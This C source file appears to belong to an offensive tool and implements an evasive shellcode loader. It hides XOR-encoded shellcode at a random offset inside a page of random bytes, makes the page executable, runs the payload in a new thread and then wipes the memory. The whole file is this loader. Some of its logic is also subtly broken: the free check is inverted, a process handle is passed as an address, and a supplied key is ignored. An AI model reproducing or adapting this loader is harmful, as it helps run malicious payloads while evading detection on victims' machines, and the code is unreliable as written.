#include "page.h"

#include <ntsecapi.h>

#ifdef _DEBUG
#include <stdio.h>

VOID
dump_ctx_struct(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	printf("PPAGE_SHELLCODE_CONTEXT Dump ->\n"
		"\t\tKey = 0x%x\n"
		"\t\tLocation = 0x%x\n"
		"\t\tSize = 0x%zx\n"
		"\t\tPage = 0x%llx\n",
		pCtx->u8Key,
		pCtx->dwLocation,
		pCtx->uSize,
		pCtx->lpPage
	);
}
#endif

PPAGE_SHELLCODE_CONTEXT
allocate_large_page(
	HANDLE hTarget,
	DWORD cbPageSize
)
{
	PPAGE_SHELLCODE_CONTEXT pCtx = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PAGE_SHELLCODE_CONTEXT));
	if (pCtx == NULL)
		return NULL;

	pCtx->uSize = ALIGN_PAGE(cbPageSize * FACTOR);
	if ((pCtx->lpPage = VirtualAlloc(hTarget, pCtx->uSize, MEM_COMMIT, PAGE_READWRITE)) != NULL)
	{
		RtlGenRandom(pCtx->lpPage, pCtx->uSize);
		pCtx->dwLocation = RANDOM_NUMB(0, pCtx->uSize);
	}

	return pCtx;
}

VOID
destroy_context(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	if (pCtx == NULL)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, (LPVOID)pCtx);
}

VOID
encode_shellcode_content(
	PPAGE_SHELLCODE_CONTEXT pCtx,
	PBYTE pbBuffer,
	SIZE_T cbBuffer,
	UINT8 u8Key
)
{
	if (u8Key == 0)
		pCtx->u8Key = (RANDOM_NUMB(0, 0xFF) & 0xFF);

	for (SIZE_T i = 0; i < cbBuffer; i++)
	{
		pbBuffer[i] ^= pCtx->u8Key;
	}
}

VOID
place_shellcode_rand(
	PPAGE_SHELLCODE_CONTEXT pCtx,
	PBYTE pbBuffer,
	SIZE_T cbBuffer
)
{
	RtlCopyMemory((PBYTE)pCtx->lpPage + pCtx->dwLocation, pbBuffer, cbBuffer);
}

VOID
execute_shellcode(
	PPAGE_SHELLCODE_CONTEXT pCtx
)
{
	DWORD dwOldProtect;
	if (VirtualProtect(pCtx->lpPage, pCtx->uSize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		PBYTE pbLocation = (PBYTE)pCtx->lpPage + pCtx->dwLocation;

		HANDLE hThread;
		if ((hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pbLocation, 0, 0, 0)))
		{
			WaitForSingleObject(hThread, INFINITE);
		}
	}

	RtlSecureZeroMemory(pCtx->lpPage, pCtx->uSize);
	VirtualFree(pCtx->lpPage, 0, MEM_RELEASE);
}